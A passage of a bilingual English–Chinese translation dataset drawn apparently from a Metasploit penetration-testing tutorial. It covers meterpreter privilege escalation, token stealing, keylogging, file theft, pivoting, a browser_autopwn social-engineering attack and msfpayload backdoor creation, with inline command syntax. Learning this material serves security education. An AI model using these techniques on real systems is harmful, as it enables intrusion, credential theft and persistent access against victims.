  zh: 在我们希望添加其他子网和网关的情况下，我们可以使用枢纽的概念，为优化攻击添加一些路由。以下是路由支持的命令：
- en: '[PRE8]'
  id: totrans-108
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: Another command that helps during pivoting is port-forwarding. Meterpreter supports
    port forwarding via the following command.
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 在枢纽过程中有用的另一个命令是端口转发。Meterpreter支持通过以下命令进行端口转发。
- en: 'The syntax for this command is as follows:'
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 此命令的语法如下：
- en: '[PRE9]'
  id: totrans-111
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: As soon as an attacker breaks into any system, the first thing that he/she does
    is check what privilege levels he/she has to access the system. Meterpreter provides
    a command for working out the privilege level after breaking into the system.
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦攻击者侵入任何系统，他/她首先要做的是检查他/她有权访问系统的权限级别。Meterpreter在侵入系统后提供了一个用于确定特权级别的命令。
- en: 'The syntax for this command is as follows:'
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 此命令的语法如下：
- en: '[PRE10]'
  id: totrans-114
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: The following screenshot demonstrates the working of `getuid` in meterpreter.
    In the following screenshot, the attacker is accessing the system with the `SYSTEM`
    privilege. In a Windows environment, the `SYSTEM` privilege is the highest possible
    privilege available.
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 以下屏幕截图演示了`getuid`在meterpreter中的工作。在下面的屏幕截图中，攻击者正在以`SYSTEM`权限访问系统。在Windows环境中，`SYSTEM`权限是可用的最高权限。
- en: '![The meterpreter module](img/4483OT_04_08.jpg)'
  id: totrans-116
  prefs: []
  type: TYPE_IMG
  zh: '![meterpreter模块](img/4483OT_04_08.jpg)'
- en: 'Suppose we failed to get access to the system as a `SYSTEM` user, but succeeded
    in getting access via the administrator, then meterpreter provides you with many
    ways to elevate your access levels. This is called **privilege escalation**. The
    commands are as follows:'
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 假设我们未能以`SYSTEM`用户的身份访问系统，但成功以管理员身份访问系统，那么meterpreter提供了许多提升访问级别的方法。这被称为**权限提升**。命令如下：
- en: '**Syntax**: `meterpreter>getsystem`'
  id: totrans-118
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**语法**：`meterpreter>getsystem`'
- en: '**Syntax**: `meterpreter>migrate process_id`'
  id: totrans-119
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**语法**：`meterpreter>migrate process_id`'
- en: '**Syntax**: `meterpreter>steal_token process_id`'
  id: totrans-120
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**语法**：`meterpreter>steal_token process_id`'
- en: The first method uses an internal procedure within the meterpreter to gain the
    system access, whereas in the second method, we are migrating to a process that
    is running with a `SYSTEM` privilege. In this case, the exploit by default gets
    loaded in any process space of the Windows operating system. But, there is always
    a possibility that the user clears that process space by deleting that process
    from the process manager. In a case like this, it's wise to migrate to a process
    which is usually untouched by the user. This helps in maintaining a prolonged
    access to the victim machine. In the third method, we are actually impersonating
    a process which is running as a `SYSTEM` privileged process. This is called **impersonation**
    via **token stealing**.
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 第一种方法使用meterpreter内部程序来获取系统访问权限，而在第二种方法中，我们正在迁移到以`SYSTEM`权限运行的进程。在这种情况下，漏洞默认加载到Windows操作系统的任何进程空间中。但是，用户始终有可能通过从进程管理器中删除该进程来清除该进程空间。在这种情况下，迁移到通常不受用户触及的进程是明智的。这有助于保持对受害者机器的长期访问。在第三种方法中，我们实际上是在模拟一个以`SYSTEM`特权进程运行的进程。这被称为**通过令牌窃取进行模拟**。
- en: Basically, Windows assigns users with a unique ID called **Secure Identifier**
    (**SID**). Each thread holds a token containing information about the privilege
    levels. Impersonating a token happens when one particular thread temporarily assumes
    the identity of another process in the same system.
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 基本上，Windows为用户分配了一个称为**安全标识符**（**SID**）的唯一ID。每个线程都持有一个包含有关权限级别信息的令牌。当一个特定的线程暂时承担同一系统中另一个进程的身份时，就会发生令牌模拟。
- en: 'We have seen the usage of process IDs in the preceding commands, but how do
    we fetch the process ID? That is exactly what we I shall be covering in this section.
    Windows runs various processes and the exploit itself will be running in the process
    space of the Windows system. To list all these processes with their PIDs and the
    privilege levels, we use the following meterpreter command:'
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经在前面的命令中看到了进程ID的用法，但是我们如何获取进程ID呢？这正是我将在本节中介绍的内容。Windows运行各种进程，而利用漏洞本身将在Windows系统的进程空间中运行。为了列出所有这些进程及其PID和权限级别，我们使用以下meterpreter命令：
- en: '[PRE11]'
  id: totrans-124
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: 'The following screenshot gives a clear picture of the `ps` command:'
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: 以下屏幕截图清楚地展示了`ps`命令的工作情况：
- en: '![The meterpreter module](img/4483OT_04_10.jpg)'
  id: totrans-126
  prefs: []
  type: TYPE_IMG
  zh: '![meterpreter模块](img/4483OT_04_10.jpg)'
- en: In the preceding screenshot, we have the PIDs listed. We can use these PIDs
    to escalate our privileges. Once you steal a token, it can be dropped using the
    `Drop_token` command.
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的屏幕截图中，我们列出了PID。我们可以使用这些PID来提升我们的权限。一旦你窃取了一个令牌，可以使用`Drop_token`命令来丢弃它。
- en: 'The syntax for this command is as follows:'
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: 该命令的语法如下：
- en: '[PRE12]'
  id: totrans-129
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: Another interesting command from the stdapi set is the `shell` command. This
    spawns a shell in the target system and enables us to navigate through the system
    effortlessly.
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: stdapi集中另一个有趣的命令是`shell`命令。这在目标系统中生成一个shell，并使我们能够轻松地浏览系统。
- en: 'The syntax for this command is as follows:'
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 该命令的语法如下：
- en: '[PRE13]'
  id: totrans-132
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: 'The following screenshot shows the usage of the shell command:'
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: 以下屏幕截图显示了shell命令的用法：
- en: '![The meterpreter module](img/4483OT_04_11.jpg)'
  id: totrans-134
  prefs: []
  type: TYPE_IMG
  zh: '![meterpreter模块](img/4483OT_04_11.jpg)'
- en: The preceding screenshot shows that we are inside the target system. All the
    usual windows command shell scripts such as `dir`, `cd`, and `md` work here.
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: 前面的屏幕截图显示我们在目标系统内部。所有通常的Windows命令shell脚本，如`dir`、`cd`和`md`在这里都可以使用。
- en: 'After briefly covering system commands, let''s start learning the filesystem
    commands. A filesystem contains a working directory. To find out the current working
    directory in the target system, we use the following command:'
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 简要介绍了系统命令后，让我们开始学习文件系统命令。文件系统包含一个工作目录。为了找出目标系统中的当前工作目录，我们使用以下命令：
- en: '[PRE14]'
  id: totrans-137
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: 'The following screenshot shows the command in action:'
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 以下屏幕截图显示了该命令的使用情况：
- en: '![The meterpreter module](img/4483OT_04_12.jpg)'
  id: totrans-139
  prefs: []
  type: TYPE_IMG
  zh: '![meterpreter模块](img/4483OT_04_12.jpg)'
- en: 'Suppose you wish to search for different files on the target system, then we
    can use a command called `search`. The syntax for this command is as follows:'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: 假设你想在目标系统上搜索不同的文件，那么我们可以使用一个名为`search`的命令。该命令的语法如下：
- en: '[PRE15]'
  id: totrans-141
  prefs: []
  type: TYPE_PRE
  zh: '[PRE15]'
- en: 'Various options available under the search command are:'
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: 搜索命令下可用的各种选项包括：
- en: '`-d`: This is the directory to begin the search. If nothing is specified, then
    it searches all drives.'
  id: totrans-143
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-d`：这是开始搜索的目录。如果未指定任何内容，则搜索所有驱动器。'
- en: '`-f`: The pattern that we would like to search for. For example, `*.pdf`.'
  id: totrans-144
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-f`：我们想要搜索的模式。例如，`*.pdf`。'
- en: '`-h`: Provides the help context.'
  id: totrans-145
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-h`：提供帮助上下文。'
- en: '`-r`: Used when we need to recursively search the subdirectories. By default
    this is set to true.'
  id: totrans-146
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-r`：当我们需要递归搜索子目录时使用。默认情况下，这是设置为true的。'
- en: Once we get the file we need, we use the `download` command to download it to
    our drive.
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们得到所需的文件，我们使用`download`命令将其下载到我们的驱动器上。
- en: 'The syntax for this command is as follows:'
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: 该命令的语法如下：
- en: '[PRE16]'
  id: totrans-149
  prefs: []
  type: TYPE_PRE
  zh: '[PRE16]'
- en: 'By now we have covered the core commands, system commands, networking commands,
    and filesystem commands. The last section of the `stdapi` command set is the user-interface
    commands. The most commonly used commands are the `keylogging` commands. These
    commands are very effective in sniffing user account credentials:'
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，我们已经涵盖了核心命令、系统命令、网络命令和文件系统命令。`stdapi`命令集的最后一部分是用户界面命令。最常用的命令是`keylogging`命令。这些命令在嗅探用户帐户凭据方面非常有效：
- en: '**Syntax**: `meterpreter>keyscan_start`'
  id: totrans-151
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**语法**：`meterpreter>keyscan_start`'
- en: '**Syntax**: `meterpreter>keyscan_dump`'
  id: totrans-152
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**语法**：`meterpreter>keyscan_dump`'
- en: '**Syntax**: `meterpreter>keyscan_stop`'
  id: totrans-153
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**语法**：`meterpreter>keyscan_stop`'
- en: 'This is the procedure of the usage of this command. The following screenshot
    explains the commands in action:'
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: 这是使用该命令的过程。以下截图解释了命令的执行过程：
- en: '![The meterpreter module](img/4483OT_04_13.jpg)'
  id: totrans-155
  prefs: []
  type: TYPE_IMG
  zh: '![meterpreter模块](img/4483OT_04_13.jpg)'
- en: 'The communication between the meterpreter and its targets is done via type-length-value.
    This means that the data is getting transferred in an encrypted manner. This leads
    to multiple channels of communications. The advantage of this is that multiple
    programs can communicate with an attacker. The creation of channels is illustrated
    in the following screenshot:'
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: meterpreter与其目标之间的通信是通过类型-长度-值进行的。这意味着数据以加密方式传输。这导致了多个通信通道。这样做的好处是多个程序可以与攻击者进行通信。通道的创建在以下截图中有所说明：
- en: '![The meterpreter module](img/4483OT_04_14.jpg)'
  id: totrans-157
  prefs: []
  type: TYPE_IMG
  zh: '![meterpreter模块](img/4483OT_04_14.jpg)'
- en: 'The syntax for this command is as follows:'
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: 该命令的语法如下：
- en: '[PRE17]'
  id: totrans-159
  prefs: []
  type: TYPE_PRE
  zh: '[PRE17]'
- en: '`-c` is the parameter that tells the meterpreter to channel the input/output.
    When the attack requires us to interact with multiple processes then the concept
    of channels comes in handy as a tool for the attacker. The `close` command is
    used to exit a channel.'
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: '`-c`是告诉meterpreter通道输入/输出的参数。当攻击需要我们与多个进程进行交互时，通道的概念就成为攻击者的有用工具。`close`命令用于退出通道。'
- en: Auxiliary modules in Metasploit
  id: totrans-161
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Metasploit中的辅助模块
- en: 'Auxiliary modules are not exploits but help an attacker in doing various tasks
    in a scenario of pen testing. It includes scans, DoS attacks, and fuzzing. In
    this section, we shall explore this module. The auxiliary modules come in various
    categories, detailed as follows:'
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 辅助模块不是利用，而是帮助攻击者在渗透测试场景中执行各种任务。它包括扫描、DoS攻击和模糊测试。在本节中，我们将探讨这个模块。辅助模块分为各种类别，详细如下：
- en: '**Denial of Service** (**DoS**)'
  id: totrans-163
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**拒绝服务**（**DoS**）'
- en: This provides a list of tools for performing the Denial of Service attacks.
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: 这提供了一系列工具，用于执行拒绝服务攻击。
- en: '**Fuzzers**'
  id: totrans-165
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**模糊测试器**'
- en: Fuzzing is another important method that aids in determining potential exploitable
    targets. This auxiliary module provides the attacker with various kinds of fuzzing
    scripts to use in automated attacks.
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: 模糊测试是另一种有助于确定潜在可利用目标的重要方法。该辅助模块为攻击者提供各种模糊测试脚本，用于自动化攻击。
- en: '**Gather**'
  id: totrans-167
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**收集**'
- en: Gathering information is an extremely important task. As we all know, the hacker
    cycle begins with information gathering and you can never have too much information
    about the target. The more information we can gather, the closer and more efficient
    our attack will be.
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 信息收集是一项非常重要的任务。众所周知，黑客的循环始于信息收集，关于目标的信息永远不会太多。我们能够收集的信息越多，我们的攻击就会越接近和更有效。
- en: '**Scanner**'
  id: totrans-169
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**扫描器**'
- en: Network scanning follows the information gathering phase. As an attacker its
    always beneficial to have the network layout in our hands so as to plan the entry
    and exit points. This can also be helpful if we wish to include the pivoting concept
    in our attack to go deeper into the target network.
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 网络扫描紧随信息收集阶段。作为攻击者，掌握网络布局总是有利的，以便规划进入和退出点。如果我们希望在攻击中包含枢纽概念以深入目标网络，这也会有所帮助。
- en: '**Spoof**'
  id: totrans-171
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**欺骗**'
- en: Spoofing is a way to gain improved privileges in the target system. These modules
    provided in the Metasploit framework help us do this. These can also aid us during
    the Man in the Middle attacks where spoofing is essential to succeed in the attack.
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: 欺骗是在目标系统中获得提升权限的一种方式。Metasploit框架中提供的这些模块帮助我们做到这一点。这些模块还可以在中间人攻击中帮助我们，其中欺骗是成功攻击的关键。
- en: '**VOIP**'
  id: totrans-173
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**VOIP**'
- en: Voice over IP devices gives us very juicy information if we can sniff the traffic.
    The auxiliary modules in this category help us to exploit the VOIP devices with
    ease.
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们能够嗅探流量，语音IP设备会给我们提供非常有价值的信息。该类别中的辅助模块帮助我们轻松利用VOIP设备。
- en: '**Wi-Fi**'
  id: totrans-175
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Wi-Fi**'
- en: Various Wi-Fi hotspots such as cafés and airports provide a perfect playground
    for an attacker. Innocent people who use the Internet at these sites can be pawned
    using these auxiliary modules.
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: 各种Wi-Fi热点，如咖啡馆和机场，为攻击者提供了一个完美的游乐场。在这些地方使用互联网的无辜人们可以通过这些辅助模块被攻击。
- en: The preceding list is not limited but just provides us with an idea as to how
    Metasploit, when used as an exploitation framework, gives the power to the attacker
    by aiding him/her with these extra tools.
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 上述列表并不限于此，只是为我们提供了一个关于Metasploit作为利用框架时如何通过这些额外工具给予攻击者权力的想法。
- en: 'In order to perform a simple tcp scan of the target we can use the following
    auxiliary modules:'
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: 为了对目标进行简单的TCP扫描，我们可以使用以下辅助模块：
- en: '**Syntax**: `msf>use auxiliary/scanner/portscan/tcp`'
  id: totrans-179
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**语法**：`msf>use auxiliary/scanner/portscan/tcp`'
- en: '**Syntax**: `auxiliary(tcp)>show options`'
  id: totrans-180
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**语法**：`auxiliary(tcp)>show options`'
- en: The `show options` command as described earlier can be used to understand the
    requirements of this module in order to successfully execute it.
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所述，`show options`命令可用于了解该模块的要求，以成功执行它。
- en: '![Auxiliary modules in Metasploit](img/4483OT_04_15.jpg)'
  id: totrans-182
  prefs: []
  type: TYPE_IMG
  zh: '![Metasploit中的辅助模块](img/4483OT_04_15.jpg)'
- en: 'RHOST is the target IPs that we need to provide. So we set the RHOST to the
    target system IP as explained in the previous sections. Verbose mode by default
    is false, if we change it to true then the amount of activity by the scanner increases
    exponentially. So, in the following screenshot, we see that verbose mode is false
    and the scan is done over the first 150 ports:'
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: RHOST是我们需要提供的目标IP。因此，我们将RHOST设置为目标系统IP，如前几节所述。默认情况下，详细模式为false，如果我们将其更改为true，那么扫描器的活动量将呈指数级增加。因此，在下面的屏幕截图中，我们看到详细模式为false，扫描是在前150个端口上进行的：
- en: '![Auxiliary modules in Metasploit](img/4483OT_04_16.jpg)'
  id: totrans-184
  prefs: []
  type: TYPE_IMG
  zh: '![Metasploit中的辅助模块](img/4483OT_04_16.jpg)'
- en: 'Suppose we are interested in finding out the hosts that are up and running
    in a network; it''s worth doing an ARP sweep so that we come to know the live
    hosts in the network. The parameters that need to be passed in this auxiliary
    module are the remote host, source host, and MAC address for the source host.
    To specify a range of IPs to the scanner, we follow this syntax:'
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 假设我们有兴趣查找网络中正在运行的主机；值得进行ARP扫描，以便我们了解网络中的活动主机。需要在这个辅助模块中传递的参数是远程主机、源主机和源主机的MAC地址。要指定要扫描的IP范围，我们遵循以下语法：
- en: '[PRE18]'
  id: totrans-186
  prefs: []
  type: TYPE_PRE
  zh: '[PRE18]'
- en: The `x/y` range in the last part informs the scanner that `x` is the starting
    IP of the range and `y` is the finishing IP of the range. These are analogous
    to the Nmap scanner.
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
  zh: 最后一部分中的`x/y`范围通知扫描器，`x`是范围的起始IP，`y`是范围的结束IP。这类似于Nmap扫描器。
- en: Auxiliary modules have various scripts available for doing the peripheral tasks
    such as information gathering and scanning. These come in handy in the scenario
    of real-time pen testing. This section proves the point about how robust and scalable
    the Metasploit framework actually is, making this a one-stop shop for learning
    the basics of penetration testing.
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 辅助模块有各种可用于执行外围任务的脚本，如信息收集和扫描。在实时渗透测试的场景中，这些非常有用。本节证明了Metasploit框架实际上是多么强大和可扩展，使其成为学习渗透测试基础知识的一站式商店。
- en: Client-side attacks with auxiliary modules
  id: totrans-189
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用辅助模块进行客户端攻击
- en: When the victim is behind NAT/Firewall, it is not possible to directly exploit
    the system through open ports. In such a case, we need to use the classic social-engineering
    attack to gain access to the system by exploiting some of the other applications
    such as browsers and plugins. In this video, we shall see the server category
    of the auxiliary modules. The module in use for this attack is the classic `browser_autopwn`
    script provided by metasploit.
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 当受害者处于NAT/防火墙后面时，不可能通过开放端口直接利用系统。在这种情况下，我们需要使用经典的社会工程攻击来利用一些其他应用程序，如浏览器和插件，以获得对系统的访问。在这个视频中，我们将看到辅助模块的服务器类别。用于此攻击的模块是metasploit提供的经典`browser_autopwn`脚本。
- en: 'The syntax for this command is as follows:'
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: 该命令的语法如下：
- en: '[PRE19]'
  id: totrans-192
  prefs: []
  type: TYPE_PRE
  zh: '[PRE19]'
- en: In this case, we shall be hosting a malicious server, which waits for incoming
    connections. The attack will be sent via social engineering in the form of a URL,
    which the user needs to open in a browser. Our server preloads a set of available
    browser-based exploits and waits for the connection. As soon as the URL is clicked
    and a connection is established, it tries to inject various packets into the browser
    with which the user is browsing the URL. In turn, it exploits the known browser
    vulnerabilities giving us complete control over the target system.
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，我们将托管一个恶意服务器，等待传入连接。攻击将通过社会工程以URL的形式发送，用户需要在浏览器中打开。我们的服务器预先加载了一组可用的基于浏览器的利用程序，并等待连接。一旦单击URL并建立连接，它会尝试向用户正在浏览URL的浏览器注入各种数据包。反过来，它利用已知的浏览器漏洞，使我们完全控制目标系统。
- en: 'As usual, once we enter an exploit module, we check for the options that we
    need to input. The options provided in this auxiliary module are as follows:'
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: 通常情况下，一旦我们进入一个利用模块，我们就会检查需要输入的选项。在这个辅助模块中提供的选项如下：
- en: '`LHOST` – The attacker machine''s IP address'
  id: totrans-195
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`LHOST` - 攻击者机器的IP地址'
- en: '`SRVHOST` – Usually sets to 0.0.0.0 by default'
  id: totrans-196
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`SRVHOST` - 通常默认设置为0.0.0.0'
- en: '`SRVPORT` – The local port on the attacker machine that listens to the incoming
    connections'
  id: totrans-197
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`SRVPORT` - 攻击者机器上监听传入连接的本地端口'
- en: '`SSL` – Toggle between true or false to enable a SSL connection'
  id: totrans-198
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`SSL` - 切换true或false以启用SSL连接'
- en: '`SSLcert` – If hosting a web page, then you can provide the path to the SSL
    certificate you wish to use'
  id: totrans-199
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`SSL证书` - 如果托管网页，则可以提供要使用的SSL证书的路径'
- en: '`SSL version` – By default it uses SSL3'
  id: totrans-200
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`SSL版本` - 默认情况下使用SSL3'
- en: '`URIPATH` – The attack URL format is specified by `URIPATH`'
  id: totrans-201
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`URIPATH` - `URIPATH`指定了攻击URL的格式'
- en: 'Let''s see, the values that we need to set in order to execute the attack.
    It''s shown in the following screenshot:'
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看看执行攻击所需设置的值。如下屏幕截图所示：
- en: '![Client-side attacks with auxiliary modules](img/4483OT_04_17.jpg)'
  id: totrans-203
  prefs: []
  type: TYPE_IMG
  zh: '![使用辅助模块进行客户端攻击](img/4483OT_04_17.jpg)'
- en: In the preceding screenshot, you can see the setup in detail. We have set the
    SRV port to 80, which is the default HTTP port. This will avoid any hints of doubt
    to the victim about a threat associated with the link. The same holds true for
    setting URIPATH to `/` as this option makes the URL a simple URL without appending
    it with gibberish alphabets. We also set the LHOST to the IP of the attacker machine,
    in this case our machine itself.
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 在上面的屏幕截图中，您可以详细了解设置。我们已将SRV端口设置为80，这是默认的HTTP端口。这将避免任何关于链接威胁的疑虑。设置URIPATH为`/`也是同样的道理，因为这个选项使URL成为一个简单的URL，而不是附加一些无意义的字母。我们还将LHOST设置为攻击者机器的IP，在这种情况下是我们自己的机器。
- en: 'The syntaxes for these commands are as follows:'
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: 这些命令的语法如下：
- en: '`msf auxiliary(browser_autopwn)>set lhost ip_address`'
  id: totrans-206
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf auxiliary(browser_autopwn)>set lhost ip_address`'
- en: '`msf auxiliary(browser_autopwn)>set srvport port_number`'
  id: totrans-207
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf auxiliary(browser_autopwn)>set srvport port_number`'
- en: '`msf auxiliary(browser_autopwn)>set URIPATH /`'
  id: totrans-208
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf auxiliary(browser_autopwn)>set URIPATH /`'
- en: '`msf auxiliary(browser_autopwn)>exploit`'
  id: totrans-209
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msf auxiliary(browser_autopwn)>exploit`'
- en: Once we accomplish setting the values it's time to run the `exploit` command.
    The following screenshot shows that the exploit server gets ready in no time by
    loading itself with exploit scripts!
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们完成设置数值，就该运行`exploit`命令了。以下截图显示，利用服务器加载自身的利用脚本后，准备就绪！
- en: '![Client-side attacks with auxiliary modules](img/4483OT_04_18.jpg)'
  id: totrans-211
  prefs: []
  type: TYPE_IMG
  zh: '![辅助模块的客户端攻击](img/4483OT_04_18.jpg)'
- en: As the user clicks on the link in the browser, the exploits start working and
    performs the exploitation for us. In the following screenshot, you can see that
    the meterpreter channels opened, giving us access to the victim. This attack is
    a client-side exploitation and not direct system exploitation. This requires interaction
    with the victim/target, which forms the majority of the attack. The art of social
    engineering of an attacker will be put in to test in this attack to make the victim
    click on the provided link. The game ends only when the victim clicks on the link.
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: 当用户在浏览器中点击链接时，利用开始工作并为我们执行利用。在下面的截图中，你可以看到meterpreter通道已打开，让我们可以访问受害者。这种攻击是客户端的利用，而不是直接的系统利用。这需要与受害者/目标的互动，这构成了攻击的大部分。攻击者的社会工程学艺术将在这次攻击中得到考验，以使受害者点击提供的链接。游戏只有在受害者点击链接时才结束。
- en: '![Client-side attacks with auxiliary modules](img/4483OT_04_19.jpg)'
  id: totrans-213
  prefs: []
  type: TYPE_IMG
  zh: '![辅助模块的客户端攻击](img/4483OT_04_19.jpg)'
- en: 'As soon as the victim clicks on the link, we see a lot of activity on the screen
    as shown in the screenshot:'
  id: totrans-214
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦受害者点击链接，我们就会看到屏幕上出现了很多活动，如截图所示：
- en: '![Client-side attacks with auxiliary modules](img/4483OT_04_20.jpg)'
  id: totrans-215
  prefs: []
  type: TYPE_IMG
  zh: '![辅助模块的客户端攻击](img/4483OT_04_20.jpg)'
- en: In the preceding screenshot, we can see that a few of the exploits failed to
    work. When we observe them closely we can see the occurrence of the word "firefox"
    in them. That means that the user clicked on this link in a non-Firefox environment.
    I have used Windows Internet Explorer to demonstrate this exercise.
  id: totrans-216
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的截图中，我们可以看到一些利用未能成功工作。当我们仔细观察它们时，我们可以看到它们中出现了“firefox”一词。这意味着用户在非Firefox环境中点击了这个链接。我用Windows
    Internet Explorer来演示这个练习。
- en: Another interesting thing we observed in this module is that as soon as the
    exploit is successful, the exploit migrates itself to `notepad.exe`. This is because
    in such an attack there is a high chance that the user restarts the browser since
    there will be an infinite page-loading waiting-period for the user, and he/she
    might even try to close the tab. In such a case, we do not want to lose the connection
    which we managed to gain to the box. Therefore, the auxiliary module is intelligent
    enough to think this and migrate itself to a safer process in the background such
    as `notepad.exe` or the process similar to it.
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在这个模块中观察到的另一个有趣的事情是，一旦利用成功，利用就会迁移到`notepad.exe`。这是因为在这样的攻击中，用户重新启动浏览器的可能性很高，因为用户会有一个无限的页面加载等待时间，他/她甚至可能会尝试关闭标签页。在这种情况下，我们不希望失去我们成功获得的与该系统的连接。因此，辅助模块足够智能，可以考虑到这一点，并将自己迁移到后台的更安全的进程，如`notepad.exe`或类似的进程。
- en: Once you get hold of the meterpreter session, you know what you are supposed
    to do! We have covered the meterpreter in detail in the previous sections.
  id: totrans-218
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦你掌握了meterpreter会话，你就知道你应该做什么！我们在前面的章节中详细介绍了meterpreter。
- en: Creating backdoors in Metasploit
  id: totrans-219
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 在Metasploit中创建后门
- en: We have seen a lot of payloads when we tried to set them in our first exploit.
    This makes me think that if we could find a way to attach these payloads independent
    of the exploit, and use social engineering to get more targets owned, then my
    success rate will increase in my attack. To answer these prayers, Metasploit saves
    the day with a script called as `msfpayload`!
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们尝试设置第一个利用时，我们看到了很多有效载荷。这让我想，如果我们能找到一种方法来独立于利用附加这些有效载荷，并利用社会工程学来获取更多的目标，那么我的攻击成功率将会提高。为了回答这些祈祷，Metasploit通过一个名为`msfpayload`的脚本拯救了这一天！
- en: Navigate to `/opt/metasploit/msf3/`. Here you shall find an executable script
    by the name of `msfpayload`. Using `msfpayload`, we can create a malicious binary
    file that can then be given to the victim and will help us to exploit his/her
    system.
  id: totrans-221
  prefs: []
